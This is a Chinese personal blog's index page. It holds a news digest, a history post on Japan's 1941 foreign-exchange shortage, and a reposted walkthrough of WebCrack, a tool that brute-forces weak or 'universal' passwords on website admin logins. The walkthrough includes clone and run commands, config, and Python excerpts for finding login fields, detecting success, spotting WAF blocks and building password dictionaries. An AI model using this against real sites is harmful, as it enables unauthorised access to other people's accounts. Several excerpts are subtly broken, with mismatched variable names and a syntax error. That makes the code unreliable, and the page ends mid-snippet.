<li>习近平出访缅甸，这是中国最高领导人19年来首次访问缅甸。其中一项重要目标，便是推进中国在印度洋的门户皎漂港的项目。<a href="http://www.bbc.com/zhongwen/simp/chinese-news-51146741" target="_blank" rel="noopener">source: BBC</a>, <a href="https://www.dw.com/zh/习近平抵达缅甸：官方热烈欢迎-民间担忧加剧/a-52044385?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source2: DW</a></li>
<li>英国宣布 31 日的脱欧大庆计划，其中包括上演灯光秀和发行纪念币。。<a href="https://www.dw.com/zh/英国宣布脱欧大庆计划/a-52053130?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source: DW</a></li>
<li>默克尔表示，德国这样的开放国家，不应将华为这样的个别公司拒之门外，而且没有华为，德国5G网络建设也会受到威胁。如今，联邦内政部长也做出了类似的表态。<a href="https://www.dw.com/zh/德内政部长力挺华为参与德国5g扩建/a-52051010?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source: DW</a></li>
</ul>
<h4 id="科技">科技</h4>
<ul>
<li>Google 将淘汰第三方Cookie。<a href="http://www.ftchinese.com/story/001085945" target="_blank" rel="noopener">source</a></li>
<li>微软正式终止支持 Windows 7。<a href="https://www.williamlong.info/archives/5949.html" target="_blank" rel="noopener">source</a></li>
<li>微软正式发布基于 Chromium 的浏览器 the New Microsoft Edge。拥有更快的速度、更低的内存占用，更多的隐私选项，支持 Windows 7、8、8.1、10 和 macOS，支持全部现有的 Chrome 扩展。<a href="https://www.appinn.com/the-new-microsoft-edge-base-chromium/" target="_blank" rel="noopener">source</a></li>
<li>Sony 计划向 PC 移植其独占游戏作品。<a href="https://t.me/solidot/9937" target="_blank" rel="noopener">source: Solidot</a></li>
<li>Google 的母公司 Alphabet 股票市场首次突破 1 万亿美元，成为第四家跨越这一门槛的美国科技企业。<a href="http://www.ftchinese.com/story/001085991" target="_blank" rel="noopener">source: FT</a></li>
<li>中科院计算所团队推出“完全自主设计、开发和实现”的“木兰”编程语言，很多开发者发现解包后的木兰语言其实就是建立在 Python 之上，将 Python 构建的环境、包和项目都编译成一个可执行文件。似乎木兰只是在顶层做了一个接口，将底层编译、优化等众多工作都交给了原版 Python。“木兰”编程语言是Python语言的套壳产品。<a href="https://www.williamlong.info/archives/5952.html" target="_blank" rel="noopener">source</a>。</li>
</ul>
<h2 id="言论">言论</h2>
<ul>
<li>如果还没想清楚，就用蛮力算法。 —— Ken Thompson</li>
<li>不要使用反正弦和反余弦函数——你总能用优美的恒等式，或者是计算向量点积来更好地解决问题。—— Jim Conyngha</li>
<li>在存储日期中的年份的时候，请使用四位数字。—— David Martin</li>
<li>避免使用不对称结构。—— Andy Huber</li>
<li>代码写的越急，程序跑得越慢。—— Roy Carlson</li>
<li>你用英语都写不出来的东西就别指望用代码写了。—— Peter Halpern</li>
<li>如果代码和注释不一致，那很可能两者都错了。—— Norm Schryer</li>
<li>如果你发现特殊情况太多，那你肯定是用错方法了。—— Carig Zerouni</li>
<li><p>先把数据结构搞清楚，程序的其余部分自现。—— David Jones</p></li>
<li><p>I don't care who does the electing, so long as I get to do the nominating. - <a href="https://en.wikiquote.org/wiki/William_M._Tweed" target="_blank" rel="noopener">William M. Tweed</a></p></li>
</ul>
<h2 id="文章">文章</h2>
<ul>
<li><a href="https://www.bbc.com/future/article/20170607-why-printers-add-secret-tracking-dots" target="_blank" rel="noopener">Why printers add secret tracking dots</a>。彩色打印机厂商会在页面上添加隐形标志，但是从不对外界透露。</li>
<li><a href="https://www.vinaysahni.com/best-practices-for-a-pragmatic-restful-api" target="_blank" rel="noopener">RESTful API 最佳实践</a></li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/55277/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="治部少辅">
      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="治部少辅">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                
                <a href="/posts/55277/" class="post-title-link" itemprop="url">Weekly-29</a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-01-07 12:33:09" itemprop="dateCreated datePublished" datetime="2020-01-07T12:33:09+08:00">2020-01-07</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2020-01-22 13:23:13" itemprop="dateModified" datetime="2020-01-22T13:23:13+08:00">2020-01-22</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Weekly/" itemprop="url" rel="index"><span itemprop="name">Weekly</span></a></span>

                
                
              
            </span>
          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Comments: </span>
                <a href="/posts/55277/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/55277/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body han-init-context" itemprop="articleBody">

      
      

      
        
          <p><img src="https://imgs.codewoody.com/uploads/big/93b05a2c7a9935cc6df5ce26784451fc.jpg"></p>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/posts/55277/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/49957/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="治部少辅">
      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="治部少辅">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                
                <a href="/posts/49957/" class="post-title-link" itemprop="url">关于珍珠港事件前日本外汇枯竭的考证</a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-01-06 10:41:29" itemprop="dateCreated datePublished" datetime="2020-01-06T10:41:29+08:00">2020-01-06</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2020-01-22 13:23:13" itemprop="dateModified" datetime="2020-01-22T13:23:13+08:00">2020-01-22</time>
              
            
          </span>

          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Comments: </span>
                <a href="/posts/49957/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/49957/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body han-init-context" itemprop="articleBody">

      
      

      
        
          
            <p>在日本偷袭珍珠港事件以前，日本大量从美国尽快必要的战争物资，尤其是石油。在珍珠港事件之前，美国开始执行对日本的物资禁运。很多人因此认为，如果日本不去作这个死，集中全力去解决中国问题，那么抗战胜负，未可知也。</p>
<p>但大多数普通人不知道的是，事实上到 1941 年日本的外汇储备已经枯竭。也就是说，即便美国不去制裁日本，日本也不会有钱去找美国购买至关重要的战略物资（如石油，橡胶等）。在这种情况下，日本铤而走险，抢占法国、荷兰在东南亚的殖民地以获取战略物资（例如法属印度支那的橡胶和婆罗洲的油田，还包括粮食、铁、有色金属等）就成了无可奈何的必然选择。日本的外汇枯竭，事实上是日本侵略中国导致国力日渐枯竭的后果。这篇文章主要就这一问题进行考证。</p>
<h2 id="外汇枯竭">外汇枯竭</h2>
<p>知乎上一个<a href="https://www.zhihu.com/question/284203566" target="_blank" rel="noopener">高赞回答</a>提到了这个问题。</p>
<blockquote>
<p>其实原因很明显：日本侵华亏惨了老本，经济濒临崩溃，购买石油、粮食等战略物资的能力已近于枯竭，到1941年，按美国驻日大使的说法，日本可用于支付的外汇只相当于2万德国马克。（约瑟夫。C。格鲁《使日十年》）</p>
</blockquote>
<blockquote>
<p>在中文网络上，搜索关于1941年日本外汇储备的情况也几乎都能追溯到这个引用。不过这个引用细究一下有点奇怪。作者约瑟夫·C·格鲁是美国驻日大使，日本政府的财政状况，他何以清楚呢？毕竟当年不是现在，日本政府、军部应该不会定期公开发布全面的财政报告。</p>
</blockquote>
<p><a href="https://book.douban.com/subject/1479333/" target="_blank" rel="noopener">《使日十年》(<i>Ten Years in Japan</i>)</a>，是 1932 年至 1942 年间担任美国驻日大使<a href="https://zh.wikipedia.org/wiki/%E7%BA%A6%E7%91%9F%E5%A4%AB%C2%B7%E6%A0%BC%E9%B2%81" target="_blank" rel="noopener">约瑟夫-C-格鲁(Joseph Clark Grew)</a>的日记及公私文件摘录。该书的英文原版可以在<a href="https://archive.org/details/TenYearsInJapan/page/n327" target="_blank" rel="noopener">这个链接</a>查看。在该链接中，<a href="https://archive.org/details/TenYearsInJapan/page/n399" target="_blank" rel="noopener">第399页</a>，章节 Frozen credits bring japan close to bankruptcy写道:</p>
<blockquote>
<p>October 9, 1941</p>
<p>According to information received by a member of my staff from what is regarded as a very reliable source, <strong>the amount of foreign exchange available to the Japanese Government now is approximately 20,000 reichsmarks</strong>, and under the circumstances the Japanese Government will be unable to avoid defaulting on contracts calling for foreign exchange on maturity. The freezing regulations which were put into effect by the United States, Great Britain, and the Netherlands East Indies have completely cut off any exchange transactions in the currencies of those countries, and in addition have greatly reduced transactions in the currencies of South American countries. According to this information, his own contracts involve foreign exchange totalling approximately five million Swedish kronen, and during recent months Japanese purchases of Swedish goods have been primarily financed through Berlin, persumably through German advanced credits.</p>
<p>The Japanese have been informed recently by the Germans that these credits are now frozen and are to used only to purchase of German goods. According to our informant it is possible that this action by the Germans was taken in anticipation of Japan's withdrawal from the Axis. According to another soure it is believed that since Sweden is heavily indebted to Germany for armaments, the Germans are now demanding in return from Sweden goods instead of Swedish kronen. Reports are current here that Japan is now eighty million marks in debt to Germany.</p>
<p>In actual fact Japan is now in virtually the same embarrassing position from the point of view of international finance as are designated foreigners in this country.</p>
</blockquote>
<p>这里，作者直接提到了，根据十分可靠的信息来源，日本政府的外汇储备大约是两万德国马克，日本将无力支付外汇合同。由美国，英国和荷兰东印度公司联合制定的冻结条款阻止了日本获得这些国家的货币储备，同时也削弱了日本和南美国家的交易。近几个月以来，日本和瑞士方面的价值五百万瑞士克朗的订单主要在依靠德国的贷款进行支付。不过近期德国告知日本方面日本的贷款也被冻结，而且贷款只能用于从德国购买商品。目前日本已经欠了德国大约八百万马克。这意味着日本的财政即将崩溃。</p>
<p>一些其他有意思的发现（下面的页码都是前面给出的英文原版链接中的页码）：</p>
<ol type="1">
<li>第 326 页: 1941 年，大使已经听到了很多谈论日本将会对珍珠港发动大规模的突然袭击的说法，并且报告了政府。原文是: <i>There is a lot of talk around town to the effect that the Japanese, in case of a break with the United States, are planning to go all out in a surprise attack on Pearl Harbour. Of course I informed our Government.</i></li>
</ol>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/28945/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="治部少辅">
      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="治部少辅">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                
                <a href="/posts/28945/" class="post-title-link" itemprop="url">[转载]网站后台爆破工具: WebCrack</a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-01-02 12:57:07 / Modified: 14:45:23" itemprop="dateCreated datePublished" datetime="2020-01-02T12:57:07+08:00">2020-01-02</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/黑客/" itemprop="url" rel="index"><span itemprop="name">黑客</span></a></span>

                
                
              
            </span>
          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Comments: </span>
                <a href="/posts/28945/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/28945/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body han-init-context" itemprop="articleBody">

      
      

      
        
          
            <p>这是一篇转载的文章。文章来源是：<a href="https://zhuanlan.zhihu.com/p/89205738" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89205738</a></p>
<h2 id="webcrack-简介">WebCrack 简介</h2>
<p>WebCrack 是一款开源免费的web后台弱口令/万能密码批量爆破、检测工具。</p>
<p>不仅支持如discuz，织梦，phpmyadmin等主流CMS的后台爆破，并且对于绝大多数小众CMS甚至个人开发网站后台都有效果，只需在工具中导入后台地址即可进行自动化检测。</p>
<h2 id="使用方法">使用方法</h2>
<h3 id="下载">下载</h3>
<p>GitHub 项目: <a href="https://github.com/yzddmr6/WebCrack" target="_blank" rel="noopener">https://github.com/yzddmr6/WebCrack</a>。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/yzddmr6/WebCrack</span><br></pre></td></tr></table></figure>
<h3 id="安装所需依赖">安装所需依赖</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure>
<h3 id="运行脚本">运行脚本</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python webcrack.py </span></span><br><span class="line">*****************************************************</span><br><span class="line">*　　　　　　　　　　　　　　　　　　　　　　 　    * </span><br><span class="line">****************    Code By yzddMr6   ***************</span><br><span class="line">*　　　　　　　　　　　　　　　　　　　　　　 　    *</span><br><span class="line">*****************************************************</span><br><span class="line">File or Url:</span><br></pre></td></tr></table></figure>
<p>输入文件名则进行批量爆破，输入 URL 则进行单域名爆破。</p>
<h3 id="自定义配置">自定义配置</h3>
<p>在 <code>cms.json</code>里面可以进行自定义配置</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"这是cms的名称"</span>,</span><br><span class="line">    <span class="attr">"keywords"</span>: <span class="string">"这里是cms后台页面的关键字，是识别cms的关键"</span>,</span><br><span class="line">    <span class="attr">"captcha"</span>: <span class="string">"1 为后台有验证，0 为没有。因为此版本并没有处理验证码，所以为 1 则退出爆破"</span>,</span><br><span class="line">    <span class="attr">"exp_able"</span>: <span class="string">"是否启用万能密码模块爆破"</span>,</span><br><span class="line">    <span class="attr">"success_flag"</span>: <span class="string">"登录成功过后的关键字"</span>,</span><br><span class="line">    <span class="attr">"fail_flag"</span>: <span class="string">"请谨慎填写此项。如果填写此项，遇到里面的关键字就会退出爆破，用于 dz 等对于爆破有次数限制的cms"</span>,</span><br><span class="line">    <span class="attr">"alert"</span>: <span class="string">"若为 1 则会打印下面的 note 内容"</span>,</span><br><span class="line">    <span class="attr">"note"</span>: <span class="string">"请保证本文件是 UTF 格式，并且请勿删除此说明"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>文件里面给出了集中常见的 cms 的配置方案，可进行参考。</p>
<h2 id="原理分析">原理分析</h2>
<p>根据我们平时使用burpsuite中的爆破的原理，可知webcrack的爆破原理与其差异不大，自动分析找到爆破点、带入字典进行匹配、判断是否成功。</p>
<h3 id="寻找爆破点">寻找爆破点</h3>
<p>根据提取到的参数名来匹配用户名和密码的位置（缺陷：可能不包含在已设定的选项中）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> content.find_all(<span class="string">'input'</span>):</span><br><span class="line">    ok_flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> x.has_attr(<span class="string">'name'</span>):</span><br><span class="line">        parameter = x[<span class="string">'name'</span>]</span><br><span class="line">    <span class="keyword">elif</span> x.has_attr(<span class="string">'id'</span>):</span><br><span class="line">        parameter = x[<span class="string">'id'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parameter = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> x.has_attr(<span class="string">'value'</span>):</span><br><span class="line">        value = x[<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = <span class="string">'0000'</span></span><br><span class="line">    <span class="keyword">if</span> paramter:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user_key:</span><br><span class="line">            <span class="keyword">for</span> z <span class="keyword">in</span> [<span class="string">'user'</span>, <span class="string">'name'</span>, <span class="string">'zhanghao'</span>, <span class="string">'yonghu'</span>, <span class="string">'email'</span>,.<span class="string">'account'</span>]:</span><br><span class="line">                <span class="keyword">if</span> z <span class="keyword">in</span> paramter.lower():</span><br><span class="line">                    value = <span class="string">'&#123;username&#125;'</span></span><br><span class="line">                    user_key = parameter</span><br><span class="line">                    ok_flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ok_flag:</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> [<span class="string">'pass'</span>, <span class="string">'pw'</span>, <span class="string">'mima'</span>]:</span><br><span class="line">                <span class="keyword">if</span> y <span class="keyword">in</span> parameter.lower():</span><br><span class="line">                    value = <span class="string">'&#123;pass_word&#125;'</span></span><br><span class="line">                    pass_key = parameter</span><br><span class="line">                    ok_flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        data[parameter] = str(value)</span><br></pre></td></tr></table></figure>
<h3 id="判断是否成功">判断是否成功</h3>
<p>原理就是先对两个错误请求的返回值进行比较，如果不同，则无法进行判断，退出爆破；如果相同，则记录下来作为判断的标准。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_error_length</span><span class="params">(conn, path, data)</span>:</span></span><br><span class="line">    data1 = data</span><br><span class="line">    cookie_error_flag = <span class="number">0</span></span><br><span class="line">    dynamic_reg_len = <span class="number">0</span></span><br><span class="line">    data2 = str(data1.replace(<span class="string">'%7Buser_name%7D'</span>, <span class="string">'admin'</span>))</span><br><span class="line">    data2 = str(data2.replace(<span class="string">'%7Bpass_word%7D'</span>, <span class="string">'length_test'</span>))</span><br><span class="line">    res_test = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>,</span><br><span class="line">        allow_redirects=<span class="keyword">True</span>, proxies=requests_proxies()) <span class="comment"># 先请求一次</span></span><br><span class="line">    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>,</span><br><span class="line">        allow_redirects=<span class="keyword">True</span>, proxies=requests_proxies())</span><br><span class="line">    res_02.encoding = res_02.apparent_encoding</span><br><span class="line">    res = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>, allow_redirects=<span class="keyword">True</span>,</span><br><span class="line">        proxies=requests_proxies())</span><br><span class="line">    res.encoding = res.apparent_encoding</span><br><span class="line">    error_length_02 = len(res_02.text + str(res_02.headers))</span><br><span class="line">    error_length = len(res.text + str(res.headers))</span><br><span class="line">    <span class="keyword">if</span> error_length_02 != error_length:</span><br><span class="line">        cookies_error_flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> error_length, cookie_error_flag, dynamic_req_len</span><br></pre></td></tr></table></figure>
<p>根据黑名单判断，出现黑名单中的情况判定为爆破失败</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fail_words = [<span class="string">'密码错误'</span>, <span class="string">'重试'</span>, <span class="string">'不正确'</span>, <span class="string">'密码有误'</span>,<span class="string">'不成功'</span>, <span class="string">'重新输入'</span>, <span class="string">'history.back'</span>, <span class="string">'不存在'</span>, <span class="string">'登录失败'</span>, <span class="string">'登陆失败'</span>,<span class="string">'出错'</span>, <span class="string">'已被锁定'</span>,<span class="string">'history.go'</span>,<span class="string">'安全拦截'</span>,<span class="string">'还可以尝试'</span>,<span class="string">'无效'</span>,<span class="string">'攻击行为'</span>,<span class="string">'创宇盾'</span>, <span class="string">'非法'</span>,<span class="string">'百度云加速'</span>,<span class="string">'安全威胁'</span>,<span class="string">'防火墙'</span>,<span class="string">'黑客'</span>, <span class="string">'不合法'</span>,<span class="string">'warning.asp?msg='</span>,<span class="string">'Denied'</span>]</span><br></pre></td></tr></table></figure>
<p>为了提高准确度，防止误报，还有重新检查的环节。就是再次把爆破出的帐号密码发送一次，将返回值与一个新的错误返回值进行对比，如果不同，则表示爆破成功。（为什么不使用前面记录下来的错误返回值进行对比，因为WAF的存在或其他因素的干扰会导致返回值的变化）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recheck</span><span class="params">(path, data, user_name, pass_word)</span>:</span></span><br><span class="line">    data1 = data</span><br><span class="line">    conn = requests.session()</span><br><span class="line">    pass_word = str(pass_word.replace(<span class="string">'&#123;user&#125;'</span>, user_name))</span><br><span class="line"></span><br><span class="line">    data_test = str(data1.replace(<span class="string">'%7Buser_name%7D'</span>, user_name))</span><br><span class="line">    data_test = str(data_test.replace(<span class="string">'%7Bpass_word%7D'</span>, <span class="string">'length_test'</span>))</span><br><span class="line"></span><br><span class="line">    data2 = str(data1.replace(<span class="string">'%7Buser_name%7D'</span>, user_name))</span><br><span class="line">    data2 = str(data2.replace(<span class="string">'%7Bpass_word%7D'</span>, pass_word))</span><br><span class="line"></span><br><span class="line">    res_01 = conn.post(url=path, data=data_test, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>,</span><br><span class="line">                       allow_redirects=<span class="keyword">False</span>, proxies=requests_proxies())</span><br><span class="line">    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>,</span><br><span class="line">                       allow_redirects=<span class="keyword">False</span>, proxies=requests_proxies())</span><br><span class="line">    res_01.encoding = res_01.apparent_encoding</span><br><span class="line">    res_02.encoding = res_02.apparent_encoding</span><br><span class="line">    error_length_01 = len(res_01.text+str(res_01.headers))</span><br><span class="line">    error_length_02 = len(res_02.text+str(res_02.headers))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> error_length_01 == error_length_02:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="动态词典">动态词典</h3>
<p>根据域名自动生成动态词典</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_dynam_dic</span><span class="params">(url)</span>:</span></span><br><span class="line">    dynam_pass_dic = []</span><br><span class="line">    tmp_dic = []</span><br><span class="line">    suffix_dic = [<span class="string">''</span>, <span class="string">'123'</span>, <span class="string">'888'</span>, <span class="string">'666'</span>, <span class="string">'123456'</span>]</span><br><span class="line">    list1 = url.split(<span class="string">'/'</span>)</span><br><span class="line">    host = list1[<span class="number">2</span>].split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    compile_ip = re.compile(<span class="string">'^(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)$'</span>)</span><br><span class="line">    <span class="keyword">if</span> compile_ip.match(host):</span><br><span class="line">        check_ip = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        check_ip = <span class="number">0</span></span><br><span class="line">    <span 